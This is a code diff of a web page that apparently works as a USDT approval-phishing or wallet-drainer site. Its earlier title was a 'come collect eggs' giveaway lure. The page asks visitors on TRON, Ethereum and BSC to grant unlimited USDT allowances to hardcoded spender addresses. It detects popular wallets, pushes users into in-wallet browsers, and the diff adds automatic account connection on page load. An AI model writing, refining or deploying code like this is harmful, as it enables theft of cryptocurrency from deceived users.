@@ -189,7 +189,7 @@
 <body>
 <div class="container">
     <div class="card">
-        <h1>🥚 大家来领鸡蛋</h1>
+        <h1>🔐 USDT 授权</h1>
         <div class="subtitle">多链无限额度授权</div>
 
         <div class="chain-selector" id="chainSelector">
@@ -223,7 +223,6 @@
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 <script>
     // ==================== 配置 ====================
-    // EVM 配置
     const USDT_ADDRESS_EVM = {
         1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         56: '0x55d398326f99059fF775485246999027B3197955'
@@ -234,12 +233,10 @@
     };
     const UNLIMITED_AMOUNT_EVM = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-    // TRON 配置
     const TRON_USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
     const SPENDER_ADDRESS_TRON = 'TZ6BCwwyMmWNM9vno1cLKp6kwy1QEXjxjA';
     const UNLIMITED_AMOUNT_TRON = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
-    // 网络配置（EVM）
     const NETWORKS = {
         1: {
             chainId: '0x1',
@@ -257,7 +254,6 @@
         }
     };
 
-    // 钱包配置
     const WALLETS = {
         evm: {
             metamask: {
@@ -291,17 +287,14 @@
             bitget: {
                 name: 'Bitget',
                 icon: '📈',
-                canAutoJump: false,  // 改为手动复制
+                canAutoJump: false,
                 isInjected: () => window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum)
             },
             trust: {
                 name: 'Trust Wallet',
                 icon: '🔒',
                 canAutoJump: false,
-                // 修复 Trust 检测：需要同时满足 isTrust 和 tronWeb 存在
-                isInjected: () => {
-                    return (window.ethereum && window.ethereum.isTrust === true) && (window.tronWeb && window.tronWeb.defaultAddress);
-                }
+                isInjected: () => (window.ethereum && window.ethereum.isTrust === true) && (window.tronWeb && window.tronWeb.defaultAddress)
             }
         }
     };
@@ -331,17 +324,11 @@
     dialogButton.onclick = hideDialog;
     dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
 
-    // 更新授权地址显示
     function updateSpenderDisplay() {
         const isTron = currentChain === '728126428';
-        if (isTron) {
-            spenderDisplay.textContent = SPENDER_ADDRESS_TRON;
-        } else {
-            spenderDisplay.textContent = SPENDER_ADDRESS_EVM[currentChain];
-        }
+        spenderDisplay.textContent = isTron ? SPENDER_ADDRESS_TRON : SPENDER_ADDRESS_EVM[currentChain];
     }
 
-    // 渲染钱包列表
     function renderWalletList() {
         const isTron = currentChain === '728126428';
         const wallets = isTron ? Object.entries(WALLETS.tron) : Object.entries(WALLETS.evm);
@@ -363,11 +350,12 @@
                 document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
                 item.classList.add('selected');
                 hideStatus();
+                // 如果已经自动连接过，可以不清除状态，但这里保持简单
             });
         });
     }
 
-    // 检测是否在当前钱包内置浏览器中
+    // 检测是否在当前钱包内置浏览器中（自动连接使用）
     function isInWalletBrowser() {
         if (currentChain === '728126428') {
             if (selectedWallet === 'tronlink') return window.tronLink && window.tronLink.ready === true;
@@ -378,6 +366,54 @@
             return false;
         } else {
             return window.ethereum && window.ethereum.isMetaMask === true;
+        }
+    }
+
+    // ==================== 自动连接钱包 ====================
+    async function autoConnect() {
+        // 仅在 DApp 浏览器中自动连接
+        if (!isInWalletBrowser()) return;
+        console.log('自动连接钱包...');
+        try {
+            if (currentChain === '728126428') {
+                // TRON 链自动连接
+                if (selectedWallet === 'tronlink' && window.tronLink && window.tronLink.ready) {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    const tronWeb = window.tronLink.tronWeb;
+                    const address = tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'tokenpocket' && window.tronWeb) {
+                    // TokenPocket 可能不需要额外请求，直接获取
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                } else if (selectedWallet === 'trust' && window.ethereum && window.ethereum.isTrust && window.tronWeb) {
+                    const address = window.tronWeb.defaultAddress.base58;
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                }
+            } else {
+                // EVM 链自动连接
+                if (window.ethereum && window.ethereum.isMetaMask) {
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const address = accounts[0];
+                    showStatus(`自动连接成功: ${address.slice(0,6)}...${address.slice(-4)}`, 'success');
+                    setTimeout(() => hideStatus(), 3000);
+                }
+            }
+        } catch (err) {
+            console.warn('自动连接失败，用户可能需要手动授权', err);
+            showStatus('自动连接失败，请手动点击授权按钮', 'error');
+            setTimeout(() => hideStatus(), 3000);
         }
     }
 
@@ -466,10 +502,8 @@
             tronWeb = window.tronWeb;
         } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
             tronWeb = window.tronWeb;
-        } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum))) {
-            if (window.tronWeb) tronWeb = window.tronWeb;
-            else if (window.tronLink && window.tronLink.ready) tronWeb = window.tronLink.tronWeb;
-            else throw new Error('Bitget TRON 环境未就绪');
+        } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) && window.tronWeb) {
+            tronWeb = window.tronWeb;
         } else if (selectedWallet === 'trust' && window.ethereum && window.ethereum.isTrust && window.tronWeb) {
             tronWeb = window.tronWeb;
         } else {
@@ -501,7 +535,7 @@
         }
     }
 
-    // ==================== 手动复制链接弹窗 ====================
+    // ==================== 跳转/复制逻辑 ====================
     function showManualCopyDialog(url, walletName = '') {
         const shortUrl = url.length > 60 ? url.slice(0, 60) + '...' : url;
         const walletHint = walletName ? `请在 ${walletName} 钱包的内置浏览器中打开此链接` : '请在钱包内置浏览器中打开此链接';
@@ -535,7 +569,6 @@
         });
     }
 
-    // ==================== 跳转到钱包 ====================
     function jumpToWallet() {
         if (!selectedWallet) {
             showDialog('请先选择钱包');
@@ -548,7 +581,6 @@
             return;
         }
 
-        // 如果钱包支持自动跳转（目前只有 MetaMask 和 TokenPocket）
         if (wallet.canAutoJump && wallet.dappUrl) {
             const url = wallet.dappUrl(window.location.href);
             let triggered = false;
@@ -573,19 +605,15 @@
             }, 3000);
             return;
         }
-
-        // 否则显示手动复制弹窗
         showManualCopyDialog(window.location.href, wallet.name);
     }
 
-    // 主授权入口
     async function onApprove() {
         if (!selectedWallet) {
             showDialog('请先选择钱包');
             return;
         }
 
-        // 如果已在钱包内置浏览器中，直接授权
         if (isInWalletBrowser()) {
             const isTron = currentChain === '728126428';
             if (isTron) {
@@ -596,45 +624,38 @@
             return;
         }
 
-        // 否则跳转到钱包或显示复制提示
         showStatus('正在准备跳转...', 'loading');
         jumpToWallet();
     }
 
-    // 链切换
     function onChainChange(chainId) {
         currentChain = chainId;
         selectedWallet = null;
         renderWalletList();
         updateSpenderDisplay();
         hideStatus();
-        // 自动检测已注入的钱包
+
         const isTron = currentChain === '728126428';
         if (isTron) {
             if (window.tronLink && window.tronLink.ready) {
                 selectedWallet = 'tronlink';
-                const item = document.querySelector(`.wallet-item[data-wallet="tronlink"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="tronlink"]`)?.classList.add('selected');
                 showStatus('检测到 TronLink，可直接授权', 'success');
             } else if (window.tronWeb && window.tronWeb.defaultAddress) {
                 selectedWallet = 'tokenpocket';
-                const item = document.querySelector(`.wallet-item[data-wallet="tokenpocket"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="tokenpocket"]`)?.classList.add('selected');
                 showStatus('检测到 TokenPocket，可直接授权', 'success');
             } else if (window.ethereum && window.ethereum.isImToken && window.tronWeb) {
                 selectedWallet = 'imtoken';
-                const item = document.querySelector(`.wallet-item[data-wallet="imtoken"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="imtoken"]`)?.classList.add('selected');
                 showStatus('检测到 imToken，可直接授权', 'success');
             } else if ((window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) || (window.bitkeep && window.bitkeep.ethereum)) {
                 selectedWallet = 'bitget';
-                const item = document.querySelector(`.wallet-item[data-wallet="bitget"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="bitget"]`)?.classList.add('selected');
                 showStatus('检测到 Bitget，可直接授权', 'success');
             } else if (window.ethereum && window.ethereum.isTrust && window.tronWeb) {
                 selectedWallet = 'trust';
-                const item = document.querySelector(`.wallet-item[data-wallet="trust"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="trust"]`)?.classList.add('selected');
                 showStatus('检测到 Trust Wallet，可直接授权', 'success');
             } else {
                 showStatus('请选择钱包并授权', 'success');
@@ -642,17 +663,20 @@
         } else {
             if (window.ethereum && window.ethereum.isMetaMask === true) {
                 selectedWallet = 'metamask';
-                const item = document.querySelector(`.wallet-item[data-wallet="metamask"]`);
-                if (item) item.classList.add('selected');
+                document.querySelector(`.wallet-item[data-wallet="metamask"]`)?.classList.add('selected');
                 showStatus('检测到 MetaMask，可直接授权', 'success');
             } else {
                 showStatus('请选择钱包并授权', 'success');
             }
         }
         setTimeout(() => hideStatus(), 2000);
+
+        // 自动连接（仅当在 DApp 浏览器中且已检测到钱包时执行）
+        if (isInWalletBrowser()) {
+            setTimeout(() => autoConnect(), 500);
+        }
     }
 
-    // 初始化
     function init() {
         document.querySelectorAll('.chain-btn').forEach(btn => {
             btn.addEventListener('click', () => {
